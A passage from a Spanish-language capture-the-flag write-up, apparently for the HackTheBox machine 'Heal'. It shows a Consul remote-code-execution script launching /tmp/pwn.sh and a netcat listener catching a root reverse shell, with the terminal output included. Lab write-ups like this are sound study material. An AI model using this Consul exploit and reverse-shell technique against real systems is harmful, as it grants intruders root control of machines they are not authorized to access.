Finalmente, ejecuté el script y obtuve una reverse shell con privilegios de `root`.

```bash
┌──(root㉿kali)-[/home/kali/consul-rce]
└─# python3 consul_rce.py -th 127.0.0.1 -tp 8500 -c "/bin/bash /tmp/pwn.sh"
[+] Check blznbaimccbuzto created successfully
[+] Check blznbaimccbuzto deregistered successfully
```

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 4433                                   
listening on [any] 4433 ...
connect to [10.10.16.62] from heal.htb [10.10.11.46] 41702
bash: cannot set terminal process group (70250): Inappropriate ioctl for device
bash: no job control in this shell
root@heal:/# whoami
whoami
root
```

